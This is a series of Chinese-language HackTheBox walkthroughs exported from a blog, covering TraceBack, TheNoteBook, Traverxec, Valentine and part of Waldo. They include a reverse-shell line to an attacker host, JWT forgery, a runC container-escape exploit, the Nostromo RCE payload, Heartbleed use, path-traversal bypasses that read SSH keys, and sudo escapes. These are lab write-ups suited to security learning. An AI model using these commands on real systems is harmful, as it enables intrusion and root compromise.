<p>可以在github找到这个WebShell的源码:<a href="https://github.com/TheBinitGhimire/Web-Shells">https://github.com/TheBinitGhimire/Web-Shells</a></p>
<p>发现默认凭据</p>
<p><img src="/images/TraceBack/5.png" alt="5"></p>
<p>登录进去后，是个php大马，可以执行系统命令</p>
<p><img src="/images/TraceBack/6.png" alt="6"></p>
<p>直接反弹到本地</p>
<p><img src="/images/TraceBack/7.png" alt="7"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>想去查看user.txt发现没有，看来user的flag不是我们的，但是发现note.txt</p>
<p><img src="/images/TraceBack/8.png" alt="8"></p>
<p>意思是说有一个工具来练习lua脚本，需要找到它</p>
<p>继续检查sudo权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(sysadmin) NOPASSWD: &#x2F;home&#x2F;sysadmin&#x2F;luvit</span><br></pre></td></tr></table></figure>

<p>尝试执行，发现需要sudo到sysadmin才可以，而且不知道是干嘛的</p>
<p><img src="/images/TraceBack/9.png" alt="9"></p>
<p>继续收集信息，发现了<code>.bash_history</code>有提示</p>
<p><img src="/images/TraceBack/10.png" alt="10"></p>
<p>看来这个<code>luvit</code>程序可以传递一个lua脚本作为参数</p>
<p>寻找lua获得shell的语法</p>
<p><img src="/images/TraceBack/11.png" alt="11"></p>
<p>跟着提示来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; evil.lua</span><br><span class="line">sudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit evil.lua</span><br></pre></td></tr></table></figure>

<p><img src="/images/TraceBack/12.png" alt="12"></p>
<p>真获得shell了</p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>linpeas发现拥有对<code>/etc/update-motd.d</code>的写入权限</p>
<p><img src="/images/TraceBack/13.png" alt="13"></p>
<p>这个是ssh登录后会触发的动作，所以我们先生成一些密钥对，完成SSH登录</p>
<p><img src="/images/TraceBack/15.png" alt="15"></p>
<p>发现输出了<code>Welcome to Xh4H land</code></p>
<p>回到<code>update-motd.d</code>目录查看文件，发现<code>00-header</code>这个文件有同样的行为</p>
<p><img src="/images/TraceBack/16.png" alt="16"></p>
<p>所以理论上我们拥有W权限，写入一个反弹shell，再进行ssh登录，由于ssh是root运行，它就会来执行这个反弹shell，从而得到提权</p>
<p>不过执行的时候有点坑！如果使用pspy64，会发现一个计划任务</p>
<p><img src="/images/TraceBack/14.png" alt="14"></p>
<p>有个备份文件每30秒会进行恢复，而且我们没有对备份文件的写入权限，所以上述操作需要在30秒内完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.4 443 &gt;&#x2F;tmp&#x2F;f&#39; &gt;&gt; 00-header</span><br><span class="line">ssh -i id_rsa sysadmin@10.10.10.181</span><br></pre></td></tr></table></figure>

<p><img src="/images/TraceBack/17.png" alt="17"></p>
<p>ssh被悬挂，我们获得了root</p>
<p><img src="/images/TraceBack/18.png" alt="18"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:TheNoteBook</title>
    <url>/2021/03/15/HTB-TheNoteBook/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/TheNoteBook/1.png" alt="1"></p>
<p>web枚举</p>
<p><img src="/images/TheNoteBook/2.png" alt="2"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>注册页面可以注册用户，注册完之后返回了JWT Token</p>
<p><img src="/images/TheNoteBook/3.png" alt="3"></p>
<p>token的内容</p>
<p><img src="/images/TheNoteBook/4.png" alt="4"></p>
<p>发现了3个线索</p>
<ul>
<li>验证的加密算法为RS256</li>
<li>HEADER部分似乎存在privKey.key的地址</li>
<li>PAYLOAD部分admin_cap疑似权限设置</li>
</ul>
<p>和SHA-256的HMAC不同，这里私钥地址应该可控，所以我们应该可以修改权限参数，并修改私钥地址为自己可控，使得请求合法</p>
<p>生成RSA 256密钥对</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out rsa_private.pem 2048	#私钥</span><br><span class="line">openssl rsa -in rsa_private.pem -outform PEM -pubout -out rsa_public.pem	#公钥</span><br></pre></td></tr></table></figure>

<p>修改私钥地址和管理员权限，并加上签名</p>
<p><img src="/images/TheNoteBook/5.png" alt="5"></p>
<p>替换cookie，之后开启简单http服务，上面放上私钥，让对方访问自己的私钥，使得签名验证合法</p>
<p>刷新页面，我们就是管理员了</p>
<p><img src="/images/TheNoteBook/6.png" alt="6"></p>
<p>后台文件上传</p>
<p><img src="/images/TheNoteBook/7.png" alt="7"></p>
<p>Behinder连接</p>
<p><img src="/images/TheNoteBook/8.png" alt="8"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>webshell会被定时清理，还是反弹bash到netcat</p>
<p>用户noah</p>
<p><img src="/images/TheNoteBook/9.png" alt="9"></p>
<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p><img src="/images/TheNoteBook/10.png" alt="10"></p>
<p>之前留言板提示了backup</p>
<p><img src="/images/TheNoteBook/11.png" alt="11"></p>
<p>发现了ssh的私钥</p>
<p><img src="/images/TheNoteBook/12.png" alt="12"></p>
<p>登录</p>
<p><img src="/images/TheNoteBook/13.png" alt="13"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>sudo权限的docker命令</p>
<p><img src="/images/TheNoteBook/14.png" alt="14"></p>
<p>查看docker和runC版本</p>
<p><img src="/images/TheNoteBook/15.png" alt="15"></p>
<p>容易受到CVE-2019-5736攻击，这里需要先开启并进入容器，然后等外部root调用容器，这样payload才会被触发</p>
<p>修改payload</p>
<p><img src="/images/TheNoteBook/16.png" alt="16"></p>
<p>编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED&#x3D;0 GOOS&#x3D;linux GOARCH&#x3D;amd64 go build main.go</span><br></pre></td></tr></table></figure>

<p>之后的操作需要两个终端</p>
<p>终端1里:开启容器，拷贝kali上编译好的exp到容器上，赋予x权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;docker exec -it webapp-dev01 &#x2F;bin&#x2F;bash</span><br><span class="line">curl ... -o main</span><br><span class="line">chmod +x main</span><br><span class="line">.&#x2F;main</span><br></pre></td></tr></table></figure>

<p>在终端1运行exp后，终端2立即调用sh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;docker exec -it webapp-dev01 &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>之后就能获得反弹shell</p>
<p><img src="/images/TheNoteBook/17.png" alt="17"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Traverxec</title>
    <url>/2020/10/28/HTB-Traverxec/</url>
    <content><![CDATA[<h1 id="Traverxec"><a href="#Traverxec" class="headerlink" title="Traverxec"></a>Traverxec</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Traverxec/1.png" alt="1"></p>
<p>直接发现了不通的地方，中间件是<code>Nostromo</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞，发现了RCE</p>
<p><img src="/images/Traverxec/2.png" alt="2"></p>
<p>msf存在利用，而且python脚本也可以，这里主要学习一些抓包的技巧</p>
<p>首先确认RCE的存在，非常简单，而且是拥有回显的</p>
<p><img src="/images/Traverxec/3.png" alt="3"></p>
<p>抓python脚本包，通过设置burp端口转发和透明代理</p>
<p><img src="/images/Traverxec/4.png" alt="4"></p>
<p>对着代理打就可以</p>
<p><img src="/images/Traverxec/5.png" alt="5"></p>
<p>这里成功抓到包了，但这个EXP似乎有点奇怪，查看python脚本，得到payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; &#39;POST &#x2F;.%0d.&#x2F;.%0d.&#x2F;.%0d.&#x2F;.%0d.&#x2F;bin&#x2F;sh HTTP&#x2F;1.0\r\nContent-Length: 1\r\n\r\necho\necho\n&#123;&#125; 2&gt;&amp;1&#39;.format(cmd)</span><br></pre></td></tr></table></figure>

<p>再去wireshark看看</p>
<p><img src="/images/Traverxec/6.png" alt="6"></p>
<p>不知道什么原因，好像<code>\r\n</code>这里会出现一些问题，修改一下payload，我们仍然可以得到RCE</p>
<p><img src="/images/Traverxec/7.png" alt="7"></p>
<p>ping和反弹shell都可以，但是回显的这里就不行了</p>
<p><img src="/images/Traverxec/8.png" alt="8"></p>
<p>有点迷</p>
<p>msf抓到也一样，不过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set proxies HTTP:127.0.0.1:8080</span><br><span class="line">set reverseallowproxy true</span><br><span class="line">set forceexploit true			&#x2F;&#x2F;关闭指纹识别，强制发送payload</span><br></pre></td></tr></table></figure>

<p>也有相同的问题</p>
<p><img src="/images/Traverxec/9.png" alt="9"></p>
<p>感觉是CRLF的问题，以后再研究，反正就是一键获取shell，顺便来个openssl加密</p>
<p><img src="/images/Traverxec/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas发现了普通用户david和一个密码</p>
<p><img src="/images/Traverxec/11.png" alt="11"></p>
<p>尝试破解，可以破解出来，但是无法切换</p>
<p><img src="/images/Traverxec/12.png" alt="12"></p>
<p>继续查看文件，在web目录的conf目录里发现了配置文件</p>
<p><img src="/images/Traverxec/13.png" alt="13"></p>
<p>提示了david的home目录里存在public_www目录，这点linpeas无法发现</p>
<p>我们不拥有david的主目录的R权限，无法枚举文件，但是却拥有主目录的<code>public_www</code>的R权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -ld &#x2F;home&#x2F;david&#x2F;public_www</span><br><span class="line">drwxr-xr-x 3 david david 4096 Oct 25  2019 &#x2F;home&#x2F;david&#x2F;public_www</span><br><span class="line"></span><br><span class="line">ls -ld &#x2F;home&#x2F;david&#x2F;</span><br><span class="line">drwx--x--x 5 david david 4096 Oct 25  2019 &#x2F;home&#x2F;david&#x2F;</span><br><span class="line"></span><br><span class="line">ls -la &#x2F;home&#x2F;david</span><br><span class="line">ls: cannot open directory &#39;&#x2F;home&#x2F;david&#39;: Permission denied</span><br></pre></td></tr></table></figure>

<p>接着发现了一个压缩包，好像是ssh私钥的备份</p>
<p><img src="/images/Traverxec/14.png" alt="14"></p>
<p>传输到kali</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 443 &gt; ssh.tgz -q 1</span><br><span class="line"></span><br><span class="line">nc -nv 10.10.16.98 443 &lt; &#x2F;home&#x2F;david&#x2F;public_www&#x2F;protected-file-area&#x2F;backup-ssh-identity-files.tgz -q 1</span><br></pre></td></tr></table></figure>

<p>解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xvf ssh.tgz</span><br></pre></td></tr></table></figure>

<p>里面存在<code>id_rsa</code></p>
<p><img src="/images/Traverxec/15.png" alt="15"></p>
<p>但是私钥被加密了，而且密码不是之前破解的，可以使用john进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py .&#x2F;id_rsa &gt; hash</span><br><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Traverxec/16.png" alt="16"></p>
<p>获取shell</p>
<p><img src="/images/Traverxec/17.png" alt="17"></p>
<p>在home目录发现了一个shell脚本</p>
<p><img src="/images/Traverxec/18.png" alt="18"></p>
<p>不用分析文件行为，知道能sudo能够运行<code>journalctl</code>就行，在<code>gtfobins</code>上得到提权方法</p>
<p><img src="/images/Traverxec/19.png" alt="19"></p>
<p>在本机上测试了一下，当我们输入<code>journalctl</code>后，仍然在终端中</p>
<p><img src="/images/Traverxec/20.png" alt="20"></p>
<p>但是在对方机器上运行，还是需要密码</p>
<p><img src="/images/Traverxec/21.png" alt="21"></p>
<p>但是<code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code>是可以执行的，所以sudoers里面应该就是这条语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo &#x2F;usr&#x2F;bin&#x2F;journalctl -n5 -unostromo.service</span><br></pre></td></tr></table></figure>

<p>这条命令输入后，仍然会在终端中，可以完成提权</p>
<p><img src="/images/Traverxec/22.png" alt="22"></p>
<p>这里有个坑，你要把终端给拉小一点，比如</p>
<p><img src="/images/Traverxec/23.png" alt="23"></p>
<p>要不然你得不到终端会话</p>
<p><img src="/images/Traverxec/25.png" alt="25"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Valentine</title>
    <url>/2020/06/24/HTB-Valentine/</url>
    <content><![CDATA[<h1 id="Valentine"><a href="#Valentine" class="headerlink" title="Valentine"></a>Valentine</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Valentine/1.jpg" alt="1"></p>
<p>就三个服务ssh、http、https </p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>在80端口发现图片</p>
<p><img src="/images/Valentine/2.jpg" alt="2"></p>
<p>这是一个提示，该漏洞图片为heartbleed漏洞(CVE-2014-0160)</p>
<p>进行目录探测</p>
<p><img src="/images/Valentine/6.jpg" alt="6"></p>
<p>发现dev目录</p>
<p><img src="/images/Valentine/7.jpg" alt="7"></p>
<p>内容经过hex编码，将其解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxd -r -ps hex.txt &gt; id_rsa</span><br></pre></td></tr></table></figure>

<p><img src="/images/Valentine/8.jpg" alt="8"></p>
<p>是一个公钥</p>
<p>而且注意该密钥的文件名为hype.txt，我们可以认为其中一个账户为hype，大多数key格式为<code>USERNAME_key</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用nmap进行vuln扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 443 --script vuln 10.10.10.79</span><br></pre></td></tr></table></figure>

<p><img src="/images/Valentine/3.jpg" alt="3"></p>
<p>确认存在漏洞</p>
<p>搜索公开漏洞</p>
<p><img src="/images/Valentine/4.jpg" alt="4"></p>
<p>使用32745.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 32745.py 10.10.10.79</span><br></pre></td></tr></table></figure>

<p><img src="/images/Valentine/5.jpg" alt="5"></p>
<p>似乎发现了一段登录凭证，且被base64编码了，进行解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg&#x3D;&#x3D; | base64 -d</span><br><span class="line">heartbleedbelievethehype</span><br></pre></td></tr></table></figure>

<p>得到了一个字符串</p>
<p>接下来就可以尝试登录ssh，输入私钥即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa hype@10.10.10.79</span><br><span class="line">heartbleedbelievethehype</span><br></pre></td></tr></table></figure>

<p><img src="/images/Valentine/9.jpg" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><p><img src="/images/Valentine/10.jpg" alt="10"></p>
<p>进程里发现root正在运行tmux，-S连接到了一个Socket文件，拥有该socket文件的W权限</p>
<p><img src="/images/Valentine/12.jpg" alt="12"></p>
<p>可以直接指定这个socket文件，连接这个会话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux -S &#x2F;.devs&#x2F;dev_sess</span><br></pre></td></tr></table></figure>

<p><img src="/images/Valentine/11.jpg" alt="11"></p>
<p>这个会话执行者是root，所以直接获取root的shell</p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>40839.c</p>
<p><img src="/images/Valentine/13.jpg" alt="13"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Waldo</title>
    <url>/2021/06/03/HTB-Waldo/</url>
    <content><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/Waldo/1.png" alt="1"></p>
<p>Web枚举需要注意，对于任何不存在的请求，该网站都会返回302，所以我们需要忽略302请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feroxbuster -u http:&#x2F;&#x2F;10.10.10.87&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dir.txt -n -f -s 200,204,301,307,308,401,403,405</span><br></pre></td></tr></table></figure>

<p>这里没有发现任何目录</p>
<p><img src="/images/Waldo/2.png" alt="2"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>查看Web首页，存在如下页面。这里有3个功能请求，删除列表，添加列表，进入列表</p>
<p><img src="/images/Waldo/3.png" alt="3"></p>
<p>进入列表1，功能和之前差不多</p>
<p><img src="/images/Waldo/4.png" alt="4"></p>
<p>主页面抓取HTTP请求，发现<code>path</code>参数传递给了<code>dirRead.php</code>，之后返回了一个列表，数据类型为<code>json</code></p>
<p><img src="/images/Waldo/5.png" alt="5"></p>
<p><code>path</code>参数想到文件读取漏洞，不过这里好像只能获取目录，尝试输入单个<code>/</code></p>
<p>似乎得到了Web的根目录，基本可以确认漏洞存在</p>
<p><img src="/images/Waldo/6.png" alt="6"></p>
<p>不过当我尝试常规的payload如<code>../../../../etc/</code>，不过似乎没有成功</p>
<p><img src="/images/Waldo/7.png" alt="7"></p>
<p>看起来是有一些过滤的存在，我可以尝试绕过，不过目前，我决定先放一放，因为我发现了另一个接口<code>fileRead.php</code></p>
<p>原始请求如下</p>
<p><img src="/images/Waldo/8.png" alt="8"></p>
<p>之前我已经成功枚举了Web目录，所以这里我尝试读取源码，payload:<code>./fileRead.php</code></p>
<p><img src="/images/Waldo/9.png" alt="9"></p>
<p>成功读取了源码，不过被添加了许多转义，读取和处理比较繁琐，不过这里返回的数据类型为<code>json</code>，表示我们可以使用<code>jq</code>并使用<code>-r</code>参数，将相应转回raw格式</p>
<p><code>fileRead.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl -s &#39;http:&#x2F;&#x2F;10.10.10.87&#x2F;fileRead.php&#39; -d &quot;file&#x3D;.&#x2F;fileRead.php&quot; |jq -r .file</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SERVER[&#39;REQUEST_METHOD&#39;] &#x3D;&#x3D;&#x3D; &quot;POST&quot;)&#123;</span><br><span class="line">        $fileContent[&#39;file&#39;] &#x3D; false;</span><br><span class="line">        header(&#39;Content-Type: application&#x2F;json&#39;);</span><br><span class="line">        if(isset($_POST[&#39;file&#39;]))&#123;</span><br><span class="line">                header(&#39;Content-Type: application&#x2F;json&#39;);</span><br><span class="line">                $_POST[&#39;file&#39;] &#x3D; str_replace( array(&quot;..&#x2F;&quot;, &quot;..\&quot;&quot;), &quot;&quot;, $_POST[&#39;file&#39;]);</span><br><span class="line">                if(strpos($_POST[&#39;file&#39;], &quot;user.txt&quot;) &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">                        $file &#x3D; fopen(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_POST[&#39;file&#39;], &quot;r&quot;);</span><br><span class="line">                        $fileContent[&#39;file&#39;] &#x3D; fread($file,filesize($_POST[&#39;file&#39;]));  </span><br><span class="line">                        fclose();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        echo json_encode($fileContent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>dirRead.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl -s &#39;http:&#x2F;&#x2F;10.10.10.87&#x2F;fileRead.php&#39; -d &quot;file&#x3D;.&#x2F;dirRead.php&quot; |jq -r .file</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if($_SERVER[&#39;REQUEST_METHOD&#39;] &#x3D;&#x3D;&#x3D; &quot;POST&quot;)&#123;</span><br><span class="line">        if(isset($_POST[&#39;path&#39;]))&#123;</span><br><span class="line">                header(&#39;Content-type: application&#x2F;json&#39;);</span><br><span class="line">                $_POST[&#39;path&#39;] &#x3D; str_replace( array(&quot;..&#x2F;&quot;, &quot;..\&quot;&quot;), &quot;&quot;, $_POST[&#39;path&#39;]);</span><br><span class="line">                echo json_encode(scandir(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_POST[&#39;path&#39;]));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                header(&#39;Content-type: application&#x2F;json&#39;);</span><br><span class="line">                echo &#39;[false]&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关注于源码的过滤，可以发现这里的过滤并没有递归进行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_POST[&#39;file&#39;] &#x3D; str_replace( array(&quot;..&#x2F;&quot;, &quot;..\&quot;&quot;), &quot;&quot;, $_POST[&#39;file&#39;]);</span><br><span class="line">$_POST[&#39;path&#39;] &#x3D; str_replace( array(&quot;..&#x2F;&quot;, &quot;..\&quot;&quot;), &quot;&quot;, $_POST[&#39;path&#39;]);</span><br></pre></td></tr></table></figure>

<p>所以可以被双写绕过</p>
<p><img src="/images/Waldo/10.png" alt="10"></p>
<p>之后尝试成功读取了<code>passwd</code>，不过这里只发现了非root用户只有<code>nobody</code>用户具有<code>sh</code></p>
<p><img src="/images/Waldo/11.png" alt="11"></p>
<p>尝试之前的<code>dirRead.php</code>，发现可以枚举任意目录文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl -s &#39;http:&#x2F;&#x2F;10.10.10.87&#x2F;dirRead.php&#39; -d &quot;path&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;&quot; |jq &#39;.[]&#39;</span><br><span class="line">&quot;.&quot;</span><br><span class="line">&quot;..&quot;</span><br><span class="line">&quot;.dockerenv&quot;</span><br><span class="line">&quot;bin&quot;</span><br><span class="line">&quot;dev&quot;</span><br><span class="line">&quot;etc&quot;</span><br><span class="line">&quot;home&quot;</span><br><span class="line">&quot;lib&quot;</span><br><span class="line">&quot;media&quot;</span><br><span class="line">&quot;mnt&quot;</span><br><span class="line">&quot;proc&quot;</span><br><span class="line">&quot;root&quot;</span><br><span class="line">&quot;run&quot;</span><br><span class="line">&quot;sbin&quot;</span><br><span class="line">&quot;srv&quot;</span><br><span class="line">&quot;sys&quot;</span><br><span class="line">&quot;tmp&quot;</span><br><span class="line">&quot;usr&quot;</span><br><span class="line">&quot;var&quot;</span><br></pre></td></tr></table></figure>

<p>根目录发现了<code>.dockerenv</code>，应该是一个<code>docker</code>环境</p>
<p>之后搜索一番，成功发现了<code>nobody</code>用户的<code>ssh</code>私钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s &#39;http:&#x2F;&#x2F;10.10.10.87&#x2F;dirRead.php&#39; -d &quot;path&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;home&quot; |jq &#39;.[]&#39;</span><br><span class="line">curl -s &#39;http:&#x2F;&#x2F;10.10.10.87&#x2F;dirRead.php&#39; -d &quot;path&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;home&#x2F;nobody&#x2F;&quot; |jq &#39;.[]&#39;</span><br><span class="line">curl -s &#39;http:&#x2F;&#x2F;10.10.10.87&#x2F;dirRead.php&#39; -d &quot;path&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;home&#x2F;nobody&#x2F;.ssh&#x2F;&quot; |jq &#39;.[]&#39;</span><br><span class="line">curl -s &#39;http:&#x2F;&#x2F;10.10.10.87&#x2F;fileRead.php&#39; -d &quot;file&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;home&#x2F;nobody&#x2F;.ssh&#x2F;.monitor&quot; |jq -r .file</span><br></pre></td></tr></table></figure>

<p><img src="/images/Waldo/12.png" alt="12"></p>
<p>成功获得shell</p>
<p><img src="/images/Waldo/13.png" alt="13"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><h3 id="枚举-1"><a href="#枚举-1" class="headerlink" title="枚举"></a>枚举</h3><p>读取<code>authorized_keys</code>发现签名用户为<code>monitor</code>而不是当前的<code>nobody</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waldo:~&#x2F;.ssh$ cat authorized_keys</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM&#x2F;VNgdz7ijwPfraXk3B&#x2F;oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6&#x2F;KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp&#x2F;zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz&#x2F;qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo</span><br></pre></td></tr></table></figure>

<p>查看sshd文件，发现ssh被监听在8888端口，这有点奇怪，因为nmap之前没有发现8888端口，而我们的ssh是从22端口接入的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waldo:~$ cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config |grep . |grep -E -v &quot;^#&quot;</span><br><span class="line">Port 8888</span><br><span class="line">PermitRootLogin no</span><br><span class="line">AuthorizedKeysFile      .ssh&#x2F;authorized_keys</span><br><span class="line">PasswordAuthentication no</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line">Subsystem       sftp    &#x2F;usr&#x2F;lib&#x2F;ssh&#x2F;sftp-server</span><br><span class="line"> </span><br><span class="line">AllowUsers nobody</span><br></pre></td></tr></table></figure>

<p>尝试重新扫描8888端口，得到<code>filtered</code>，而不是<code>closed</code>，这说明该端口开放情况未知，也许存在防火墙</p>
<p><img src="/images/Waldo/14.png" alt="14"></p>
<p>在目标上枚举端口，发现8888端口确实处于监听状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waldo:~$ netstat -pant</span><br><span class="line">netstat: can&#39;t scan &#x2F;proc - are you root?</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0    488 10.10.10.87:8888        10.10.16.12:55530       ESTABLISHED -</span><br><span class="line">tcp        0      0 :::80                   :::*                    LISTEN      -</span><br><span class="line">tcp        0      0 :::22                   :::*                    LISTEN      -</span><br><span class="line">tcp        0      0 :::8888                 :::*                    LISTEN      -</span><br></pre></td></tr></table></figure>

<p>我们可以基本确定，对方机器上存在22端口转发到8888端口的情况</p>
<p>尝试从目标机器ssh到本机的另一个用户，来进行横向移动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waldo:~$ ssh -i &#x2F;home&#x2F;nobody&#x2F;.ssh&#x2F;.monitor monitor@127.0.0.1</span><br><span class="line">monitor@waldo:~$ id</span><br><span class="line">-rbash: id: command not found</span><br><span class="line">monitor@waldo:~$ whoami</span><br><span class="line">-rbash: whoami: command not found</span><br><span class="line">monitor@waldo:~$ echo $0</span><br><span class="line">-rbash</span><br></pre></td></tr></table></figure>

<p>成功切换到宿主机，不过当前处于rbash</p>
